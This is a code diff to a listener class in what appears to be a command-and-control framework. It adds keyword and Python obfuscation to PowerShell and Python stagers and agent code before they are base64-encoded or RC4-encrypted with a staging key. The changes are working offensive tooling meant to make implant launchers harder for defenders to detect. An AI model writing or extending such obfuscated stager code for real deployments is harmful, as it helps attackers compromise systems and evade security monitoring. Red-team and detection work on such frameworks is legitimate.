@@ -449,6 +449,7 @@ class Listener(object):
                         launcherBase,
                         obfuscation_command=obfuscation_command,
                     )
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
                 if encode and (
                     (not obfuscate) or ("launcher" not in obfuscation_command.lower())
@@ -565,6 +566,10 @@ class Listener(object):
                 launcherBase += "a=urllib.request.urlopen(req).read();\n"
                 launcherBase += listener_util.python_extract_stager(stagingKey)
 
+                if obfuscate:
+                    stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
+
                 if encode:
                     launchEncoded = base64.b64encode(
                         launcherBase.encode("UTF-8")
@@ -665,25 +670,24 @@ class Listener(object):
             )
 
             stagingKey = stagingKey.encode("UTF-8")
-            unobfuscated_stager = listener_util.remove_lines_comments(
-                comms_code + stager
-            )
+            stager = listener_util.remove_lines_comments(comms_code + stager)
 
             if obfuscate:
-                unobfuscated_stager = self.mainMenu.obfuscationv2.obfuscate(
-                    unobfuscated_stager,
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager,
                     obfuscation_command=obfuscation_command,
                 )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
-                return helpers.enc_powershell(unobfuscated_stager)
+                return helpers.enc_powershell(stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 return RC4IV + encryption.rc4(
-                    RC4IV + stagingKey, unobfuscated_stager.encode("UTF-8")
+                    RC4IV + stagingKey, stager.encode("UTF-8")
                 )
             else:
-                return unobfuscated_stager
+                return stager
 
         elif language.lower() == "python":
             comms_code = self.generate_comms(
@@ -710,6 +714,10 @@ class Listener(object):
 
             stager = template.render(template_options)
             stager = stager.replace("REPLACE_COMMS", comms_code)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.python_obfuscate(stager)
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
                 return base64.b64encode(stager)
@@ -795,6 +803,8 @@ class Listener(object):
                     code,
                     obfuscation_command=obfuscation_command,
                 )
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
+
             return code
 
         elif language == "python":
@@ -829,6 +839,10 @@ class Listener(object):
                 code = code.replace(
                     'workingHours = ""', f'workingHours = "{ workingHours }"'
                 )
+
+            if obfuscate:
+                code = self.mainMenu.obfuscationv2.python_obfuscate(code)
+                code = self.mainMenu.obfuscationv2.obfuscate_keywords(code)
 
             return code
         else:
